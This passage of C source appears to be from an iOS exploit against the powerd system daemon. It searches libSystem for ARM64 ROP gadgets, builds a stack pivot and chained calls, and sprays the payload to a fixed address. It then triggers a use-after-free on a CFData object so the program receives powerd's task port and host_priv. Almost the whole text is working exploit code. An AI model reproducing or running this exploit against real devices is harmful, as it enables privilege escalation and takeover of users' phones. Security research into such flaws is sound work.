    0x1f6e7c5b4 <+28>: ldp    x27, x28, [x0, #0x40]
    0x1f6e7c5b8 <+32>: ldp    x10, x11, [x0, #0x50]
    0x1f6e7c5bc <+36>: ldr    x12, [x0, #0x60]
    0x1f6e7c5c0 <+40>: ldp    d8, d9, [x0, #0x70]
    0x1f6e7c5c4 <+44>: ldp    d10, d11, [x0, #0x80]
    0x1f6e7c5c8 <+48>: ldp    d12, d13, [x0, #0x90]
    0x1f6e7c5cc <+52>: ldp    d14, d15, [x0, #0xa0]
    0x1f6e7c5d0 <+56>: eor    x29, x10, x16
    0x1f6e7c5d4 <+60>: eor    x30, x11, x16
    0x1f6e7c5d8 <+64>: eor    x12, x12, x16
    0x1f6e7c5dc <+68>: mov    sp, x12
    0x1f6e7c5e0 <+72>: cmp    w1, #0x0                  ; =0x0
    0x1f6e7c5e4 <+76>: csinc  w0, w1, wzr, ne
    0x1f6e7c5e8 <+80>: ret
#endif
    uint64_t libsystem = get_library_address("libSystem.B");
    stack_pivot = mem_search(libsystem, "\x10\x1e\x40\xf9\x13\x50\x40\xa9\x15\x58\x41\xa9\x17\x60\x42\xa9\x19\x68\x43\xa9\x1b\x70\x44\xa9", 24);

    uint64_t *vals = (uint64_t *)&main_payload[rop_offset];
    vals[0x10/8] = stack_pivot;

    uint64_t *control_regs = vals;
    control_regs[0x18/8] = 0xdeadc0de;               // X22 -> X3
    control_regs[0x20/8] = 0xdeadc0de;               // X23
    control_regs[0x28/8] = 0xdeadc0de;               // X24
    control_regs[0x30/8] = 0xdeadc0de;                      // X25 -> X2
    control_regs[0x38/8] = 0xdeadc0de;               // X26
    control_regs[0x40/8] = 0xdeadc0de;               // X27
    control_regs[0x48/8] = 0xdeadc0de;               // X28

    control_regs[0x50/8] = 0xdeadc0de;                // X10 -> x29
    control_regs[0x58/8] = lr;                     // where to jump next ?
    control_regs[0x60/8] = stack_pointer;           // what value you want SP points to ?

}

static inline void rop_u_call(uint64_t func,uint64_t x0,uint64_t x1,uint64_t x2,
                              uint64_t x3,uint64_t x4,uint64_t x5,uint64_t lr)
{

    // BACK TO THIS LATER
    if((rop_offset+stack_offset) > getpagesize()/8) {
        printf("[*] You cannot ROP anymore, gtfo\n");
        exit(0);;
    }

    uint64_t stack_off = stack_offset;
    uint64_t *vals = (uint64_t *)&main_payload[rop_offset+stack_off];

    uint64_t *control_regs = vals;
    uint64_t *sp =(uint64_t *)&main_payload[rop_offset+stack_off];

    sp[0x50/8] = 0xdeadbeef;    // X29
    sp[0x58/8] = mach_msg_gadget;    // X30

    sp[0x40/8] = x5;        // X20
    sp[0x48/8] = func;      // X19 copied into x6 (used as BR in our chain)

    sp[0x30/8] = x3;        // X22
    sp[0x38/8] = x4;        // X21

    // it's better to avoid controlling x7, it affects mach_msg() behaviour
    sp[0x20/8] = 0x24242424;        // X24 : this makes mach_msg jumps to mach_msg+200
    sp[0x28/8] = 0xdeadc0de;        // X23

    sp[0x10/8] = x1;            // X26 will be copied into X1
    sp[0x18/8] = x2;    // X25

    sp[0/8] = 0xdeadc0de;    // X28
    sp[8/8] = 0xdeadc0de;    // X27

    // after mach_msg() jumps to +200, we have to resotre x29,x30 and x19
    // remember always sp = payload_address + rop_offset + 0x100, and 0x60 has been added by the mach_msg() epilogue
    stack_off+=0x60;
    sp = (uint64_t *)&main_payload[rop_offset +stack_off];
    sp[0x50/8] = 0x2929;    // X29
    sp[0x58/8] = control_x0_and_blr;    // // X30 (LR): now go control x0

    sp[0x48/8] = x0;    // X19 whill be copied into x0
    stack_off+=0x60;
    sp = (uint64_t *)&main_payload[rop_offset +stack_off];
    // taking control of x29,x30 again for next rop chain
    sp[0x10/8] = 0x1234;    // X29 (FP)
    sp[0x18/8] = br_x6;     // X30 (LR)

    // control_x0_and_blr : SP is increased by 0x20
    stack_off+=0x20;
    sp = (uint64_t *)&main_payload[rop_offset +stack_off];
    sp[0x30/8] = 0x1234;    // X29
    sp[0x38/8] = lr;     // X30 (LR)
    //after br_x6 the stack will increase by 0x40
    stack_off+=0x40;
    //rop_offset += stack_off;
    stack_offset =stack_off;

}
void do_prepare_payload(void)
{

    uint32_t tagsize = getpagesize()*10;
    uint8_t *tag2 = do_dummy_allocate_p(tagsize, 0xa0);
    uint64_t *vals;
    // Credit goes to Pangu for the constant address, thanks!
    payload_address = 0x118800000;
    printf("[+] Preparing payload and setting it at 0x%llx\n",payload_address);

    payload_size = 0x4000;
    if(!main_payload)
        main_payload = (uint8_t*)do_dummy_allocate_p(payload_size, 0);

    uint64_t sel = (uint64_t)sel_registerName("release");
    uint64_t libsystem = get_library_address("libSystem.B");

#if 0 /* Take more control on X0 */
     0xf9401000   ldr    x0, [x0, #0x20]
     0xf9400801   ldr    x1, [x0, #0x10]
     0xd61f0020   br     x1
#endif
    control_x0 = mem_search(libsystem, "\x00\x10\x40\xf9\x01\x08\x40\xf9\x20\x00\x1f\xd6", 12);

#if 0
    0x1f63d812c: 0xaa1303e0   mov    x0, x19
    0x1f63d8130: 0xa9417bfd   ldp    x29, x30, [sp, #0x10]
    0x1f63d8134: 0xa8c24ff4   ldp    x20, x19, [sp], #0x20
    0x1f63d8138: 0xd65f03c0   ret
#endif
    // we lost the x0 control due mach_msg_trap()'s return value,
    control_x0_and_blr = mem_search(libsystem, "\xe0\x03\x13\xaa\xfd\x7b\x41\xa9\xf4\x4f\xc2\xa8\xc0\x03\x5f\xd6", 16);


#if 0 /* stack pivot gadget */
    0x1f6e7c5a0 <+8>:  ldr    x16, [x16, #0x38] // gadget starts here
    0x1f6e7c5a4 <+12>: ldp    x19, x20, [x0]
    0x1f6e7c5a8 <+16>: ldp    x21, x22, [x0, #0x10]
    0x1f6e7c5ac <+20>: ldp    x23, x24, [x0, #0x20]
    0x1f6e7c5b0 <+24>: ldp    x25, x26, [x0, #0x30]
    0x1f6e7c5b4 <+28>: ldp    x27, x28, [x0, #0x40]
    0x1f6e7c5b8 <+32>: ldp    x10, x11, [x0, #0x50]
    0x1f6e7c5bc <+36>: ldr    x12, [x0, #0x60]
    0x1f6e7c5c0 <+40>: ldp    d8, d9, [x0, #0x70]
    0x1f6e7c5c4 <+44>: ldp    d10, d11, [x0, #0x80]
    0x1f6e7c5c8 <+48>: ldp    d12, d13, [x0, #0x90]
    0x1f6e7c5cc <+52>: ldp    d14, d15, [x0, #0xa0]
    0x1f6e7c5d0 <+56>: eor    x29, x10, x16
    0x1f6e7c5d4 <+60>: eor    x30, x11, x16
    0x1f6e7c5d8 <+64>: eor    x12, x12, x16
    0x1f6e7c5dc <+68>: mov    sp, x12
    0x1f6e7c5e0 <+72>: cmp    w1, #0x0                  ; =0x0
    0x1f6e7c5e4 <+76>: csinc  w0, w1, wzr, ne
    0x1f6e7c5e8 <+80>: ret
#endif
    stack_pivot = mem_search(libsystem, "\x10\x1e\x40\xf9\x13\x50\x40\xa9\x15\x58\x41\xa9\x17\x60\x42\xa9\x19\x68\x43\xa9\x1b\x70\x44\xa9", 24);

#if 0
    0x1f643be80: 0xa9437bfd   ldp    x29, x30, [sp, #0x30]
    0x1f643be84: 0xa9424ff4   ldp    x20, x19, [sp, #0x20]
    0x1f643be88: 0xa94157f6   ldp    x22, x21, [sp, #0x10]
    0x1f643be8c: 0xa8c45ff8   ldp    x24, x23, [sp], #0x40
    0x1f643be90: 0xd61f00c0   br     x6
#endif
    br_x6 = mem_search(libsystem, "\xfd\x7b\x43\xa9\xf4\x4f\x42\xa9\xf6\x57\x41\xa9\xf8\x5f\xc4\xa8\xc0\x00\x1f\xd6", 20);

/*
 * credit goes to @i41nbeer, idea taken from his XPC exploit
 * I'm not calling mach_msg(), just having more control over registers
 * X0 becomes uncontrolled because of mach_msg_trap() return value
 * So one more gadget needed (see br_x6 above)
 */
#if 0
    libsystem_kernel.dylib`mach_msg:
    ...
    0x1f6e013bc <+92>:  mov    x1, x26
    0x1f6e013c0 <+96>:  mov    x2, x25
    0x1f6e013c4 <+100>: mov    x3, x22
    0x1f6e013c8 <+104>: mov    x4, x21
    0x1f6e013cc <+108>: mov    x5, x20
    0x1f6e013d0 <+112>: mov    x6, x19
    0x1f6e013d4 <+116>: mov    x0, x23
    0x1f6e013d8 <+120>: bl     0x1f6e01ec8               ; mach_msg_trap
    0x1f6e013dc <+124>: cmp    w0, w27
    0x1f6e013e0 <+128>: b.eq   0x1f6e013bc               ; <+92>
    0x1f6e013e4 <+132>: tbnz   w24, #0xa, 0x1f6e01428    ; <+200>
    ...
    0x1f6e01428 <+200>: ldp    x29, x30, [sp, #0x50]
    0x1f6e0142c <+204>: ldp    x20, x19, [sp, #0x40]
    0x1f6e01430 <+208>: ldp    x22, x21, [sp, #0x30]
    0x1f6e01434 <+212>: ldp    x24, x23, [sp, #0x20]
    0x1f6e01438 <+216>: ldp    x26, x25, [sp, #0x10]
    0x1f6e0143c <+220>: ldp    x28, x27, [sp], #0x60
    0x1f6e01440 <+224>: ret

#endif
    mach_msg_gadget = mem_search((void*)mach_msg, "\xe1\x03\x1a\xaa\xe2\x03\x19\xaa\xe3\x03\x16\xaa\xe4\x03\x15\xaa\xe5\x03\x14\xaa",20);
#if 0 // the epilogue of mach_msg
    0x1f6e01428 <+200>: ldp    x29, x30, [sp, #0x50]
    0x1f6e0142c <+204>: ldp    x20, x19, [sp, #0x40]
    0x1f6e01430 <+208>: ldp    x22, x21, [sp, #0x30]
    0x1f6e01434 <+212>: ldp    x24, x23, [sp, #0x20]
    0x1f6e01438 <+216>: ldp    x26, x25, [sp, #0x10]
    0x1f6e0143c <+220>: ldp    x28, x27, [sp], #0x60
    0x1f6e01440 <+224>: ret
#endif
    restore_registers = mem_search(mach_msg,"\xfd\x7b\x45\xa9\xf4\x4f\x44\xa9\xf6\x57\x43\xa9\xf8\x5f\x42\xa9\xfa\x67\x41\xa9\xfc\x6f\xc6\xa8\xc0\x03\x5f\xd6",28);
    ret_sp = restore_registers + 24;

#if 0
    // gadgets
    printf("x0 0x%llx\n",control_x0);
    printf("blr_x3 0x%llx\n",br_x3);
    printf("stack_pivot 0x%llx\n",stack_pivot);
    printf("mach_msg_gadget 0x%llx\n",mach_msg_gadget);
    printf("restore_registers = 0x%llx\n",restore_registers);
    printf("br_x6 = 0x%llx\n",br_x6);
#endif

    vals = (uint64_t *)&main_payload[0];
    vals[0] = 0x11111111;
    vals[1] = 0x22222222;

    // LDP  X10, X11, [X16,#0x10]
    //vals[2] = payload_address + 0x100;
    vals[2] = payload_address + 0x100;
    vals[3] = 0;    // mask: put it to zero


    vals = (uint64_t *)&main_payload[0x38];
    vals[0] = 0;            //ldr    x16, [x16, #0x38]

    vals = (uint64_t *)&main_payload[0x100];
    // jump and make X0 -> target_addr
    vals[0] = control_x0;                           //  PC Control
    vals[1] = (uint64_t)sel;                  //  SEL "release"
    stack_ptr = 0x118800300;

    /* =================== Start of our ROP payload ===================*/

    rop_offset = 0x200;
    // this must be update whenever the stack pointer gets changed
    stack_offset = 0x100;
    stack_ptr = payload_address + rop_offset + stack_offset;

    // SP = 0x118800300, after this call, we'll have FP,SP and LR under control
    rop_make_stack_pivot(stack_ptr,restore_registers);

#if 0
    // check out if our ROP chain is working as expected
    rop_u_call(mprotect,0x11,0x22,0x33,0x44,0x55,0x66,restore_registers);
    rop_u_call(mprotect,0x111,0x222,0x333,0x444,0x555,0x666,restore_registers);
    rop_u_call(0xdeadb00b,0x1111,0x2222,0x3333,0x4444,0x5555,0x6666,0x40404040);
#endif

    struct hp_msg msg = {0};

    off_t mach_msg_off = payload_address + 0x3000;
    off_t mach_msg_port_off = mach_msg_off + offsetof(struct hp_msg, port.name);
    off_t mach_msg_remote_port_off = mach_msg_off + offsetof(struct hp_msg, hdr.msgh_remote_port);

    uint64_t powerd_bs_fake_service_off = payload_address + 0x3100;
    uint64_t powerd_bootstrap_service_name_off = payload_address + 0x3200;

    uint64_t powerd_task_self_name = 0x103;
#if 0
    printf("msg payload is at 0x%llx\n",mach_msg_off);
    printf("msg port offset  = 0x%llx \n",mach_msg_port_off);
    printf("mach_msg_remote_port_off  = 0x%llx \n",mach_msg_remote_port_off);
    printf("powerd_bootstrap_service_name_off  = 0x%llx \n",powerd_bootstrap_service_name_off);
    printf("bootstrap port 0x%x\n",bootstrap_port);
#endif

    msg.hdr.msgh_size = sizeof(msg);
    msg.hdr.msgh_local_port = MACH_PORT_NULL;
    msg.hdr.msgh_remote_port = 0xdeadbeef; // must be our (fake service) port
    msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.hdr.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    msg.hdr.msgh_id = 0x112233;
    msg.body.msgh_descriptor_count = 1;
    msg.port.name = 0x103;             // this must be overwritten by (rop call) task_get_special_port()
    msg.port.type = MACH_MSG_PORT_DESCRIPTOR;
    msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;

    memcpy(&main_payload[mach_msg_off-payload_address], &msg, sizeof(msg));
    memcpy(&main_payload[powerd_bootstrap_service_name_off-payload_address], FAKE_SERVICE_NAME, strlen(FAKE_SERVICE_NAME));

    /* How to get host_priv  ?
     - Register a fake service with our app group in launchd, then wait for upcoming messages
     - ROP bootstrap_look_up(bootstrap_port,"service_name",&port) // &port's address is &msg.hdr.msgh_remote_port
        this is much more easier and reliable than registering a port set and trying to guess one port of them
     - ROP task_get_special_port(task,TASK_HOST_PORT,&host) // if user is root, host == host_priv, this will overwrite &msg.port.name
     - ROP mach_msg_send(msg): better than calling mach_msg()
     - If SUCCESS, you'll have the host_priv port
     UPDATE : if you want an easy way , just send 0x103 instead without task_get_special_port(), and once received , get host_priv easily
                both methods work,
     */

    rop_u_call((uint64_t)bootstrap_look_up,bootstrap_port,powerd_bootstrap_service_name_off,mach_msg_remote_port_off,0x4444,0x5555,0x6666,restore_registers);
    //rop_u_call((uint64_t)task_get_special_port,powerd_task_self_name,TASK_HOST_PORT,mach_msg_port_off,0x4444,0x5555,0x6666,restore_registers);
    rop_u_call((uint64_t)mach_msg_send,mach_msg_off,-1,-1,-1,-1,-1,restore_registers);
    rop_u_call((uint64_t)sleep,20,-1,-1,-1,-1,-1,0x40404040);

    //printf("kr %s\n",mach_error_string(0x0000000010000003));
#if 0
    kr = mach_msg(&m.hdr,
                  MACH_SEND_MSG,
                  m.hdr.msgh_size,
                  0,
                  MACH_PORT_NULL,
                  MACH_MSG_TIMEOUT_NONE,
                  MACH_PORT_NULL);
#endif

    vals = (uint64_t *)&tag2[0];
    for(int i=0;i<tagsize;i+=payload_size) {
        memcpy(&tag2[i], main_payload, payload_size);
    }

    for(int i=0; i < (tagsize/8); i++) {
        ;//vals[i] = 0x440404000 | (i * 0x10);//0xdead0000 | i;
    }
//#define LOCAL_EXP
#ifdef LOCAL_EXP
    printf("Testing ROP chain \n");
    vm_address_t payload =0x118800000;
    kern_return_t kr = vm_allocate(mach_task_self(),&payload,payload_size,0);
    CHECK_MACH_ERR(kr,"vm_allocate()");
    memcpy((void*)payload, main_payload,payload_size);

    char *buf = malloc(1000);
    memset(buf,0xcc,1000);
    CFDataRef Data = CFDataCreate(NULL,(const UInt8 *)buf,1000);
    *(uint64_t*)Data = payload;
    *(uint64_t*)((uint8_t*)Data + 0x20) =payload_address + 0x200;

    CFRelease(Data);
    exit(0);
#endif
    payload_address = 0x118800000;
    for(int i=0;i<20000;i++) {
        send_pegged_payload(service_port, (const char*)tag2, tagsize);
    }

#if 0
    printf("Looks like msgs sent ? \n");
    Iter = 1000;
    uint64_t guess = 0;

    uint64_t target = 0x118800000;
    if(!READ_MEMORY(target, 0x100, 0xdead, &guess)) {
        printf("Failed \n");
        exit(0);
    }
    Iter = 100;
    DumpHex((const void*)guess, 0x100);
#endif

}
static void setup_service_listener()
{
    kern_return_t kr;
    fake_service_port = MACH_PORT_NULL;
    mach_port_t bs = 0;

    task_get_bootstrap_port(mach_task_self(), &bs);
    kr = bootstrap_check_in(bootstrap_port,FAKE_SERVICE_NAME,&fake_service_port);
    CHECK_MACH_ERR(kr,"bootstrap_check_in");

    //printf("Service port 0x%x \n",fake_service_port);
}
void *register_fake_service(void *arg)
{
    struct hp_msg_recv msg = {0};
    kern_return_t kr = 0;
    printf("[+] Starting a fake service with name %s\n",FAKE_SERVICE_NAME);

    setup_service_listener();
    strt_exp = 1;

#if 0
    printf("waiting for upcoming messages \n");
#endif
    for(;;) {
        kr = mach_msg(&msg.hdr,MACH_RCV_MSG,
                      0,
                      sizeof(msg),
                      fake_service_port,
                      0,
                      MACH_PORT_NULL);
        if (kr == KERN_SUCCESS) {
            //printf("[+] We got powerd task port 0x%x !!\n",msg.port.name);
            powerd_task_port = msg.port.name;

            break;
        }

    }
    pthread_mutex_unlock(&powerd_task_lock);
    //pthread_cancel(pthread_self());
    return NULL;
}

// this checks if we owned powerd process, if yes, show off powerd's task port and host_priv
int check_uexploit_success()
{
    sleep(3);
    if (powerd_task_port == MACH_PORT_NULL) {
        printf("[-] Looks like the exploit failed\n");
        pthread_mutex_lock(&powerd_task_lock);
        return 0;
    }

    printf("[+] We got powerd task port 0x%x !!\n",powerd_task_port);
    mach_port_t p = 0;
    int kr = task_get_special_port(powerd_task_port,TASK_HOST_PORT,&host_priv);
    CHECK_MACH_ERR(kr, "get_host_special_port");
    printf("[+] We have host_priv port 0x%x\n",host_priv);
    return 1;
}
int do_powend(void)
{
    //psizeP = 0x30000;
    uint64_t diff = 0;
    int ps_id = 0;
    /*
#ifdef LOCAL_EXP
    do_prepare_payload();
#endif

    do_crash_powerd();
    do_prepare_data();

    do_prepare_payload();
    */
    collected = 10;
    condidates = collect_user_memory(collected);

    uint64_t addr = do_get_payload_address(&diff,&ps_id);

    printf("[+] We got a page-aligned memory : 0x%llx with controlling object ps = 0x%x\n",addr,ps_id);
    printf("[+] The offset of the target CFData object : 0x%llx\n",diff);

    //uint32_t tagsize = getpagesize();///2;
    uint32_t tagsize = round_page(prestore_size);
    uint8_t *tag2 = do_dummy_allocate_p(tagsize, 0xc0);
    uint64_t *vals = (uint64_t *)&tag2[0];

    // we are targetting a CFData object inside a huge CFDictionary, we are calling CFRelease(CFDict)
    // make sure there is no corruption in the Dictionary
    printf("[+] Restoring memory to its old state and injecting our fake ISA pointer \n");
    uint64_t v = 0xcafebab0;
    v = payload_address;
    memcpy(&prestore[diff], &v, 8);
    printf("[+] Deallocating 0x%llx ...",addr);

    vals = (uint64_t *)&prestore[diff];

    vals[0x20/8] = payload_address + 0x200; //  ldr    x0, [x0, #0x20]

    // deallocate the target memory
    deallocate_memory_user(addr,tagsize);
    printf("Done\n");

reply:
    for(int i=0;i<400;i++) {
        send_pegged_payload(service_port, (const char*)prestore, tagsize);
    }

#if 0
    printf("Looks like msgs sent ? \n");
    Iter = 1000;
    guess = 0;

    if(!READ_MEMORY(addr+diff, 0x100, 0xdead, &guess)) {
        printf("Failed \n");
        goto reply;
    }

    DumpHex((const void*)guess, 0x100);
#endif

    printf("[+] Releasing the target CF object \n");
    io_ps_release_pspowersource(service_port,ps_id);

    return 0;

}


void start_exploit(void)
{

//#define LOCAL_EXP
#ifdef LOCAL_EXP
    // test service
    pthread_create(&svc,NULL,register_fake_service,NULL);
    sleep(5);
    mach_port_t bs,p;
    task_get_bootstrap_port(mach_task_self(), &bs);
    int kr = bootstrap_look_up(bs, FAKE_SERVICE_NAME, &p);
    CHECK_MACH_ERR(kr,"bootstrap_look_up()");
    printf("yes 0x%x\n",p);
    ping(p);
    exit(0);
    do_prepare_payload();
    exit(0);
#endif

    pthread_create(&svc,NULL,register_fake_service,NULL);
    do {
        do_crash_powerd();
        do_prepare_data();

        while(!strt_exp){}
        printf("[+] Exploit started \n");

        pthread_mutex_lock(&mutex);
        do_prepare_payload();
        pthread_mutex_unlock(&mutex);

        do_powend();

    } while(!check_uexploit_success());
    exit(0);
}
```
